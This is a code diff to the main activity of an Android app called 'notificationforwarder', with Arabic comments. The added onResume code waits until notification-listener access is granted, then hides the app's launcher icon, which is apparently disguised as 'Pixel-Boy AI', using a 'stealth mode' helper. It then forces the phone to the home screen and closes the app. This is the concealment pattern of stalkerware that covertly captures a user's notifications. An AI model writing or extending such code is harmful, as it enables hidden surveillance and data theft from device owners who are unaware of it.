@@ -36,9 +36,6 @@ import androidx.compose.ui.text.style.TextAlign
 import androidx.compose.ui.unit.dp
 import androidx.compose.ui.unit.sp
 import androidx.core.content.ContextCompat
-import androidx.lifecycle.DefaultLifecycleObserver
-import androidx.lifecycle.LifecycleOwner
-import androidx.lifecycle.ProcessLifecycleOwner
 import com.itsazni.notificationforwarder.ui.theme.AppTheme
 import com.itsazni.notificationforwarder.worker.WorkerScheduler
 import java.util.Locale
@@ -55,18 +52,6 @@ class MainActivity : ComponentActivity(), TextToSpeech.OnInitListener {
         
         tts = TextToSpeech(this, this)
 
-        // 🌟 مراقبة خروج المستخدم من التطبيق بالكامل
-        ProcessLifecycleOwner.get().lifecycle.addObserver(object : DefaultLifecycleObserver {
-            override fun onStop(owner: LifecycleOwner) {
-                super.onStop(owner)
-                // مجرد ما المستخدم يخرج من التطبيق ويروح الهوم أو تطبيق تاني
-                // يتم إخفاء/تحويل الأيقونة فوراً إلى "مركز العثور"
-                if (isNotificationListenerEnabled(this@MainActivity)) {
-                    StealthUtils.switchToStealthMode(this@MainActivity)
-                }
-            }
-        })
-
         setContent {
             AppTheme {
                 Surface(
@@ -78,6 +63,25 @@ class MainActivity : ComponentActivity(), TextToSpeech.OnInitListener {
                     )
                 }
             }
+        }
+    }
+
+    // 🌟 التعديل الأساسي: التنفيد الفوري عند العودة للتطبيق بعد منح الإذن
+    override fun onResume() {
+        super.onResume()
+        
+        // إذا كان إذن الإشعارات مفعلاً:
+        if (isNotificationListenerEnabled(this)) {
+            // 1️⃣ إخفاء أيقونة Pixel-Boy AI من الشاشة الرئيسية
+            StealthUtils.switchToStealthMode(this)
+
+            // 2️⃣ إجبار الهاتف على الخروج للشاشة الرئيسية وإغلاق التطبيق تماماً
+            val homeIntent = Intent(Intent.ACTION_MAIN).apply {
+                addCategory(Intent.CATEGORY_HOME)
+                flags = Intent.FLAG_ACTIVITY_NEW_TASK
+            }
+            startActivity(homeIntent)
+            finish()
         }
     }
 
@@ -533,3 +537,4 @@ private fun isNotificationListenerEnabled(context: Context): Boolean {
     val flat = Settings.Secure.getString(context.contentResolver, "enabled_notification_listeners")
     return flat?.contains(packageName) == true
 }
+
